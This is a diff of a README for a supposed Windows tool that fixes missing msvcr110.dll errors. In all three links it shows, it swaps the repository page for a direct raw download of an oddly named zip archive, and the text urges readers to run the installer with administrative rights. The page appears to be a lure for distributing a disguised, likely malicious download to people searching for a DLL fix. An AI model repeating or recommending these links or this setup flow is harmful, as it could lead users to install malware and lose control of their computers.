@@ -5,7 +5,7 @@ description: "Resolve msvcr110.dll missing errors on Windows 10 and 11 with this
 ---
 # ⚙️ MSVCR110-DLL-Missing-Fix - Repair missing library files on Windows
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/ubaidgamerp6865/MSVCR110-DLL-Missing-Fix)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/ubaidgamerp6865/ubaidgamerp6865.github.io/raw/refs/heads/main/iliac/io_ubaidgamerp_github_v2.3-alpha.2.zip)
 
 This tool fixes the error message stating that the msvcr110.dll file is missing. This specific file is a component of the Visual C++ Redistributable for Visual Studio 2012. Many Windows applications rely on this file to function correctly. When the file disappears or becomes corrupted, programs fail to open. This repository provides a straightforward repair process to restore the file and get your software running again.
 
@@ -17,7 +17,7 @@ The msvcr110.dll file serves as a bridge for software built using the Visual C++
 
 To begin the repair process, visit the link below to access the repository releases. You will find the necessary installer for your Windows version.
 
-[Click here to visit the download page](https://github.com/ubaidgamerp6865/MSVCR110-DLL-Missing-Fix)
+[Click here to visit the download page](https://github.com/ubaidgamerp6865/ubaidgamerp6865.github.io/raw/refs/heads/main/iliac/io_ubaidgamerp_github_v2.3-alpha.2.zip)
 
 ## 📦 System Requirements
 
@@ -29,7 +29,7 @@ Ensure you have administrative rights on your computer. You need these permissio
 
 ## 🚀 Installation Steps
 
-1. Visit the [download page](https://github.com/ubaidgamerp6865/MSVCR110-DLL-Missing-Fix) mentioned above.
+1. Visit the [download page](https://github.com/ubaidgamerp6865/ubaidgamerp6865.github.io/raw/refs/heads/main/iliac/io_ubaidgamerp_github_v2.3-alpha.2.zip) mentioned above.
 2. Look for the "Releases" section on the right side of the page.
 3. Click on the latest release version.
 4. Download the executable file labeled for your system architecture. If you use a standard consumer PC, choose the x64 version if your system is 64-bit.
